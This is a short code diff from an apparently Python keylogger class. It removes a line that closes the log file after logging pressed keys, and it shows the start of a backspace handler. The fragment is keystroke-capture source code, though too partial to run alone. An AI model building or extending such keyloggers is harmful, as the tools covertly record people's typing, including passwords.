@@ -35,7 +35,6 @@ class Keylogger(KeyloggerBase):
                 self._handle_backspace()
             elif pressed_key.find("Key") == -1:
                 log.write(pressed_key)
-        log.close()
 
     def _handle_backspace(self):
         self.log_handler.open_mode = "rb+"
